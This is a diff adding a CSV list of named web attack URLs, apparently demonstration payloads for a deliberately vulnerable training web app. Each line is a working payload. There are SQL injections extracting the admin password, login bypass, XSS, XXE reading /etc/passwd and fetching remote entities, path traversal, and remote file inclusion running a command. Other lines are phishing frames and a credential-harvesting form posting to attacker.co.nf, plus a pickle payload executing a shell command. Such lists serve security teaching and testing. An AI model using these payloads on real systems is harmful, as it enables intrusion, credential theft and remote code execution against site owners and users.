@@ -1,0 +1,23 @@
+﻿Blind SQL Injection (boolean) ,/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27
+Blind SQL Injection (time) ,/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))
+UNION SQL Injection ,/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)
+Login Bypass ,/login?username=admin&password=%27%20OR%20%271%27%20LIKE%20%271
+HTTP Parameter Pollution ,/login?username=admin&password=%27%2F*&password=*%2FOR%2F*&password=*%2F%271%27%2F*&password=*%2FLIKE%2F*&password=*%2F%271
+Cross Site Scripting (reflected) ,/?v=0.2%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E
+Cross Site Scripting (stored) ,/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E
+Cross Site Scripting (DOM) ,/?foobar#lang=en%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E
+Cross Site Scripting (JSONP) ,/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess
+XML External Entity (local) ,/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E
+XML External Entity (remote) ,/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fpastebin.com%2Fraw.php%3Fi%3Dh1rvVnvx%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E
+Server Side Request Forgery ,/?path=http%3A%2F%2F127.0.0.1%3A631
+Blind XPath Injection (boolean) ,/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n
+Cross Site Request Forgery ,/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520fontweight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E
+Frame Injection (phishing) ,/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fattacker.co.nf%2Fi%2Flogin.html%22%20style%3D%22backgroundcolor%3Awhite%3Bzindex%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bbordercollapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E
+Frame Injection (content spoofing) ,/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fattacker.co.nf%2F%22%20style%3D%22backgroundcolor%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bzindex%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E
+Clickjacking ,/?v=0.2%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackgroundcolor%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bzindex%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27http%3A%2F%2Fattacker.co.nf%2F%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E
+Full Path Disclosure ,/?path=foobar
+Source Code Disclosure ,/?path=dsvw.py
+Path Traversal ,/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+File Inclusion (remote) ,/?include=http%3A%2F%2Fpastebin.com%2Fraw.php%3Fi%3DN5ccE6iH&cmd=ifconfig
+HTTP Header Injection (phishing) ,/?charset=utf8%0D%0AXXSSProtection:0%0D%0AContentLength:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fattacker.co.nf%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fattacker.co.nf%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E
+Component with Known Vulnerability (pickle) ,/?object=cos%0Asystem%0A(S%27ping%20c%205%20127.0.0.1%27%0AtR.%0A
